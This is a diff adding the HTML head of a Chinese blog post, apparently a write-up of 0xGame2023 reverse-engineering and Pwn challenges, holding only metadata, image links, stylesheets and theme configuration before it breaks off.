@@ -1,0 +1,1253 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/China.jpg">
+  <link rel="icon" href="/img/China.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="j1ya">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Week1Re数字筑基        也可以直接打开   代码金丹还是直接打开   网络元婴手动提一下     虚拟化神没有输入   后半部分与文件操作有关   那就动调看v3   还有一种方法就是重启验证，下面是一般步骤 程序运行–&gt;注册信息输入–&gt;程序重启–&gt;执行验证机制–&gt;正确就显示已注册&#x2F;错误则不变动 通过动调没输入，但是双击打开却要求输入得出这是重启验证">
+<meta property="og:type" content="article">
+<meta property="og:title" content="0xGame2023部分Reverse与Pwn">
+<meta property="og:url" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/index.html">
+<meta property="og:site_name" content="j1ya">
+<meta property="og:description" content="Week1Re数字筑基        也可以直接打开   代码金丹还是直接打开   网络元婴手动提一下     虚拟化神没有输入   后半部分与文件操作有关   那就动调看v3   还有一种方法就是重启验证，下面是一般步骤 程序运行–&gt;注册信息输入–&gt;程序重启–&gt;执行验证机制–&gt;正确就显示已注册&#x2F;错误则不变动 通过动调没输入，但是双击打开却要求输入得出这是重启验证">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126232725-2425fbbd-acc6-435f-8085-e2d41b2e2839.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126156319-028b3982-f43b-4cb0-8da4-cf7ac96f6057.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126216345-ce798925-0fc8-4234-bca6-b299ec2193c5.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126320620-a922a06d-05fa-496f-b6df-f699b6a2f557.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126461784-f2542e7c-75d7-4ff4-9fda-573420f3af32.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126823856-3c3ec737-2c0c-4dbe-a973-62a55528ff03.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126807536-b4ec6e5c-745e-4020-8148-ba7e25437643.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696127318617-cd06c73e-88c2-4805-a317-385c8f59716b.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696127353639-14cdc7ba-7d65-4834-9de1-316d58371377.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696127243272-a534030d-2dd0-4c7b-a1ca-9a12e25d7d27.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696950439291-21948fa3-4d4b-470f-9e03-7414ef59c7f0.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696950363519-e043a79d-e8a6-42f4-b595-ad7a009e234a.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696129283992-89aab69d-6528-46a3-a76d-c6983215037d.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696129341973-7af805fc-9576-47fe-9270-9ad63533e9c5.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696129125243-72f29160-1391-413c-9c76-bf5d0adb5a9c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696598431293-060e9ae1-8d02-4015-ad98-c20470846d74.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696598461425-d6d5accf-5f92-4b1e-a0f8-d4e50bfb367b.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696598776446-a021b0be-2360-4a37-8fa5-359a7f31a868.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696599007954-2115102e-cc78-4b4a-a57a-86ec4012cc39.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601141882-34347020-c761-44cb-8039-6e2c67d0b66b.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696600057336-d8ace983-9ca8-4399-9edb-7ada1a40de8b.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601211231-f08e9709-5b08-40f0-9c97-9eebdafc66ec.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697119840748-31dd449c-de4e-4a34-b058-8a8936ee8f26.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697119780016-50c2e0b9-a5fa-42b5-ae4b-ba01e8a4e466.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697121140924-a2aceab0-7ef2-40fd-8a1c-d1f5512bf46a.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697119384044-39564f15-dee1-4d81-87f4-b623c97fee90.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697028651661-fa697698-99df-4d83-bebf-dd8eb102db47.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601836046-2993ec74-6177-49b7-9e92-5f1221e828f4.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696601853948-28fb5d0a-b657-4c53-9fb8-c2ecd0433eea.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697006479337-0a41bc02-433c-4915-adf4-023e618166ed.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696602811246-6d0b4343-74b3-4182-9831-89f95759c00c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696675842514-a94dbac9-4fe0-4d08-9393-31015a6e3b3e.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696675957369-a4765179-7081-4c72-8d90-e4bab98f2ea9.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696675940594-caef988a-f06f-4d58-9402-e37e83fb2a2d.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697007204060-bdeff981-28f4-40ca-b50a-40f9a5408b1a.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697009030059-aff24a36-2cce-40e2-abf2-1f0587b49b60.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697008828382-f965ebec-e79e-4dc2-8b90-84fd7747cf1c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696727110794-15708965-4f77-4f90-aade-780ee2d69836.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697248475485-f08e76c6-4700-4791-9467-faaf94cb66ea.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697248518303-ca15e248-d243-4824-8efb-8758dcb2f799.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697251380345-9441b9dd-9600-42a2-a600-e2d3b50d28d0.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697609883960-7e5c1387-cbba-450c-a27f-876b2480313d.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696729353037-09520dcb-87c0-466b-b8fe-4594750a99ee.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696729258453-f8f5227c-ebaf-4020-9e88-6c0a58d3eec5.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696729396381-1f9346f0-f161-4f05-a91a-feabb6328865.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731310261-315e3098-4409-4a2c-864e-ab82b449bc28.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731383544-1ff24caf-7b30-48f7-9720-deadf8439e45.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731295765-5e5bfc56-d9ff-4956-83e7-79761a6828e9.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731236233-3f07787b-d43b-401b-8823-cb3324e6744f.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612859250-585a0c6b-c779-4b21-8ab1-33e27b0f6b03.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612963416-526e5d07-0392-4fa7-87cb-1c7bccd47674.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612792030-610f1573-1ade-4e2f-806a-7f4ffa4c61ad.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612737357-1691bda6-95d5-4ade-8fbb-e4ad00542805.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697612686687-d0b23846-404b-4913-8328-8018a6a3ef34.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696731913307-924f8f31-440d-4c45-a225-e0dc4c3afc85.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696732874453-9d096675-4df8-407a-b512-30e95a5a7cc9.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696732907425-a4a45237-fed7-4c2e-bf4c-611648a66095.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696735357814-1d02ff75-a096-4c60-b65c-f6aa196515d5.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697254076862-201bfad3-148a-478a-975b-066b4987a4a9.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697253541439-f08ead82-dc11-4269-9f8d-cccbd029d457.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697253878779-6bcf554d-3d61-4bd4-9d7c-c72c0f55b637.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923079769-7f9588d0-3cbd-479f-9ea6-1aeae0c4306c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923419197-3ce1f7ec-55d0-4022-ade2-ed885361a7f0.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696924269838-1bab36e5-18a5-44ce-8847-215e1db6a9cf.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923401368-ee42513f-ef25-4248-bf3c-1f6530209d45.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923490251-38d8b78b-3aa1-4512-b29b-41c7dac12dd8.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696924165215-31e4ef97-7698-4861-992c-c98c058df515.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923956609-f6030d55-dacd-48f6-8914-e71d5ea8e6e7.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696923934671-d3c09891-c35a-44fb-a99f-8348ae4a2ccb.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696924050841-cfd1a19c-4d0d-4624-a1ce-3a75b38c7611.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696934627928-018fd979-78ee-46e7-bdd3-22d5d1c69a57.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697377387321-70a975f7-1f05-452a-8e80-2a64e7bb360b.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697380005333-dd77e540-a2ed-488f-ace9-224a50efa4f1.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697379952083-eee425e8-6cb4-43cd-85ff-0f1eb56944dc.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698146597397-fe9067ee-a9a6-46c1-b300-1583ba458650.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698146710687-c6b21d03-1d7a-4054-a7f9-310df1d7a896.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697619204803-b86248c8-54df-463b-aca5-77a482a15f59.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697619294393-c6a91da7-27b8-4047-ba4a-788dd48e16cc.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697630945215-f0a16a40-d18b-4d8b-a274-7798f539714a.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697630915042-a2e15eb6-383b-42ac-ba53-1bbfddf3d405.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698150238882-9e6c80cf-5430-4db5-b64d-d5cf7d9e3391.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698150300217-8d6dcaa7-77b6-4e6b-85d9-8d40e8f30608.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698150367621-d291c77e-3f51-4f2d-9fc8-d9093c074395.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697632424160-1416ec79-1ae1-4e63-828b-18751a393e07.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697632404168-3ccd7131-28ef-488f-bdc2-6aa275ae1cea.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698151641533-4c3b4aa8-cd44-4ba6-8cea-8cd5f740d229.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697639711284-8a8d9fa7-9a9f-43b3-95b3-1d6c3588f3e0.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697632936024-1c3f4c10-901a-4411-ad18-ad895ee5bca9.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698292119627-10680211-af0b-4fa0-a811-3050b0e7678c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698239490727-a91f673a-c822-4150-8b99-9f7f9a496ac9.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698239588628-e987159e-72e8-418a-9c1c-a053f4035239.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698307497841-c34c77af-3aa3-45ab-b4c2-29eb941e1bcf.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698245661535-2a93691a-fdb6-4509-ac45-ff7237ad3b70.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698292450682-937677ba-b760-441b-989e-61a0e3bb0e35.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697974990638-dc68376a-eeb9-41b5-9160-a376e0a0aa32.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697975248489-747ce90b-a853-4b16-a011-b1b84166ba4f.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697975236033-0c4eee0f-b191-4d84-8138-d5e0cdad07d5.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976398332-b9fc6ac0-6c43-4de7-ad76-afe74e4bf15c.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976410759-baacc2f4-ba33-4483-bb28-989d62751b07.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976371182-8a279bb1-be43-4b7f-b21f-bdba7bbb24f1.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976337904-bb9c82a9-3b1c-4945-8880-4758a6e768a7.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698919017891-0ee5cb50-8f01-49c1-a443-bf49dc09a3d7.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976637477-3fb09947-4a17-4d28-99fc-43915dcadcee.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1697976749295-8697cfbf-4c4d-4884-8bc0-a9e7b25d0cf7.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698576647083-daaffb9d-9104-4b7b-9724-de6ba3a90a7f.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698937587781-de16f757-d178-4366-a334-a8c804f39c44.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698937482393-f3b11dfb-71e4-4c93-863c-ed3f07a796a2.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698937738379-7da68857-4d12-495f-9bdc-eed8d179285f.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1698582010378-96cc68e1-f4be-4860-bac8-a2151f618bce.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065872230-7a7fefdb-08f8-4efe-a1ad-441df75b2734.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065263226-038a89ae-f3d0-43c3-b817-a06afdb98176.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065906955-c62bbd9d-6f7d-4662-89e3-d3902106af72.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699062760768-6451e4b2-e3cb-4008-9622-5a3153f90141.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065579850-efd62144-060c-4d59-8bda-28f304f683a5.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699065612488-828f85d6-e7e4-44c2-918d-79974cad5ffb.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699063863766-44b75a95-5d5e-43aa-95a4-8ffb5d69141a.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699064501846-b41ac232-89b0-41fb-a2b1-bd91e1caf9e8.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699359763465-321c386d-ed8b-415b-9f0a-0c60efc4991b.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699360433403-3925a3d8-53fd-4fe8-84bd-6709a03faea6.png">
+<meta property="og:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1699360477957-3c8c8adf-759e-4a5b-9614-61aad50cb7ac.png">
+<meta property="article:published_time" content="2023-11-20T08:57:44.000Z">
+<meta property="article:modified_time" content="2026-02-12T09:24:44.502Z">
+<meta property="article:author" content="j1ya">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://j1ya-22.github.io/2023/11/20/0xGame2023%E9%83%A8%E5%88%86Reverse%E4%B8%8EPwn/1696126232725-2425fbbd-acc6-435f-8085-e2d41b2e2839.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>0xGame2023部分Reverse与Pwn - j1ya</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"j1ya-22.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"5oPqGOgpqzM186wdJq3YyrcV-gzGzoHsz","app_key":"tdZv3tC3tP1IszSKxEodRe6e","server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
